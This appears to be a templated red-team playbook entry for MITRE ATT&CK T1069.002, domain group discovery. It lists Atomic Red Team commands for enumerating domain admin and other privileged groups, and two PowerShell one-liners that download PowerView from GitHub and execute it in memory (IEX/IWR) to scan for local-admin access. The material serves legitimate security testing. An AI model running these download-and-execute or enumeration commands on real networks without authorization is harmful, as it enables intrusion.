---
name: "T1069.002_domain-groups"
description: "Adversaries may attempt to find domain-level groups and permission settings."
category: "information-gathering"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1069.002
  - discovery
  - linux
  - macos
  - windows
  - sub-technique
technique_id: "T1069.002"
tactic: "discovery"
all_tactics:
  - discovery
platforms:
  - Linux
  - macOS
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1069/002"
tech_stack:
  - linux
  - macos
  - windows
cwe_ids:
  - CWE-200
chains_with:
  - T1069
  - T1069.001
  - T1069.003
prerequisites:
  - T1069
severity_boost:
  T1069: "Chain with T1069 for deeper attack path"
  T1069.001: "Chain with T1069.001 for deeper attack path"
  T1069.003: "Chain with T1069.003 for deeper attack path"
---

# T1069.002 Domain Groups

> **Sub-technique of:** T1069

## High-Level Description

Adversaries may attempt to find domain-level groups and permission settings. The knowledge of domain-level permission groups can help adversaries determine which groups exist and which users belong to a particular group. Adversaries may use this information to determine which users have elevated permissions, such as domain administrators.

Commands such as <code>net group /domain</code> of the Net utility, <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code> on Linux can list domain-level groups.

## Kill Chain Phase

- Discovery (TA0007)

**Platforms:** Linux, macOS, Windows

## What to Check

- [ ] Identify if Domain Groups technique is applicable to target environment
- [ ] Check Linux systems for indicators of Domain Groups
- [ ] Check macOS systems for indicators of Domain Groups
- [ ] Check Windows systems for indicators of Domain Groups
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Basic Permission Groups Discovery Windows (Domain)

Basic Permission Groups Discovery for Windows. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.

**Supported Platforms:** windows

```cmd
net localgroup
net group /domain
net group "enterprise admins" /domain
net group "domain admins" /domain
```

### Atomic Test 2: Permission Groups Discovery PowerShell (Domain)

Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain
information will be displayed.

**Supported Platforms:** windows

```powershell
get-ADPrincipalGroupMembership #{user} | select name
```

### Atomic Test 3: Elevated group enumeration using net group (Domain)

Runs "net group" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This
test will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.

**Supported Platforms:** windows

```cmd
net groups "Account Operators" /domain
net groups "Exchange Organization Management" /domain
net group "BUILTIN\Backup Operators" /domain
net group "Domain Admins" /domain
```

### Atomic Test 4: Find machines where user has local admin access (PowerView)

Find machines where user has local admin access (PowerView). Upon execution, progress and info about each host in the domain being scanned will be displayed.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-LocalAdminAccess -Verbose
```

### Atomic Test 5: Find local admins on all machines in domain (PowerView)

Enumerates members of the local Administrators groups across all machines in the domain. Upon execution, information about each machine will be displayed.

**Supported Platforms:** windows

```powershell
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-EnumerateLocalAdmin  -Verbose
```


### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Domain Groups by examining the target platforms (Linux, macOS, Windows).

2. **Assess Existing Defenses**: Review whether mitigations for T1069.002 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

No specific mitigations documented for this technique.

## Detection

### Behavioral Detection of Domain Group Discovery


## Risk Assessment

| Finding | Severity | Impact |
| ------- | -------- | ------ |
| Domain Groups technique applicable | Low | Discovery |

## CWE Categories

| CWE ID | Title |
| ------ | ----- |
| CWE-200 | Exposure of Sensitive Information |


## References

- [Atomic Red Team - T1069.002](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1069.002)
- [MITRE ATT&CK - T1069.002](https://attack.mitre.org/techniques/T1069/002)
